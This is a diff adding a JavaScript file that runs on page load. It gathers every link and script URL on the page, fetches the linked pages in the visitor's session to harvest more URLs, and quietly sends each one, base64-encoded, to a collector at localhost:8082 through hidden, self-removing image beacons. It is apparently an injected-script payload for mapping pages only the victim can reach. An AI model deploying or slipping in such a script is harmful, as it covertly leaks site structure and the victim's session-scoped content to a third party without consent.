@@ -1,0 +1,58 @@
+window.addEventListener('DOMContentLoaded', (event) => {
+
+	let scripts = document.querySelectorAll('script');
+	let a = document.querySelectorAll('a');
+	let links = new Array();
+	a.forEach((elem) => {
+		links.push(elem.href)
+	});
+
+	getLinks(links);
+	links = new Array();
+	scripts.forEach(elem => {
+		createImage(elem.src)
+	});
+
+});
+
+
+
+
+async function getLinks(links) {
+	allLinks = links;
+	links.forEach((elem) => {
+		if (elem !== 'javascript:void(0)') {
+			createImage(elem);
+			fetch(elem).then(res => res.text()).then(res => {
+				let parser = new DOMParser();
+				let doc = parser.parseFromString(res, 'text/html');
+				let s = doc.querySelectorAll('script');
+				let al = doc.querySelectorAll('a');
+				al.forEach((elem) => {
+					if (elem.href !== 'javascript:void(0)') {
+						createImage(elem.href)
+					}
+				});
+				s.forEach((elem) => {
+					if (elem.href !== 'javascript:void(0)') {
+						createImage(elem.src)
+					}
+				})
+			})
+		}
+	})
+}
+
+function createImage(url) {
+
+	let image = document.createElement('img');
+	image.setAttribute('src', 'http://localhost:8082/index.php?page_content=' + btoa(unescape(encodeURI(url + '\n'))));
+	image.style.opacity = '0';
+	image.style.position = 'absolute';
+	image.style.zIndex = '-110';
+	image.addEventListener('error', (elem) => {
+		elem.target.remove()
+	});
+	document.body.appendChild(image)
+}
+
